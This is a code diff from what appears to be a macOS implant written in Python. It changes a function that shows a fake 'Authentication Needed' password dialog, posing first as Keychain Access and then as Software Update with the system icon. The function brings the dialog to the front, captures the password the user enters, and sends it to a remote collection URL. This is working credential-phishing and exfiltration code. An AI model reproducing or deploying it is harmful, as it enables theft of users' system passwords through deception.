@@ -207,10 +207,15 @@ def addresses():
 #############################
 def prompt():
     try:
-        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with title \"Authentication Needed\" with hidden answer")
+        init = NSAlert.alloc().init()
+        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Application Updates Needed\" & return & return & \"Local macOS applications need permission to update\" & return default answer \"\" with icon file \"System:Library:CoreServices:Software Update.app:Contents:Resources:SoftwareUpdate.icns\"with title \"Authentication Needed\" with hidden answer")
+        NSApp.setActivationPolicy_(1)
+        NSApp.activateIgnoringOtherApps_(True)
         p = s.executeAndReturnError_(None)
-        p2 = str(p)
-        a = {'content':p2}
+        q = str(p)
+        c = q.replace("(<NSAppleEventDescriptor: { 'bhit':'utxt'","Button Clicked:").replace("'ttxt':'utxt'","Text Entered:").replace(" }>, None)","")
+
+        a = {'content':c}
         b = 'https://127.0.0.1/validatiion/profile/7'
         c = urllib2.Request(b,headers=headers,data=a.get('content'))
         d = urllib2.urlopen(c,context=context)
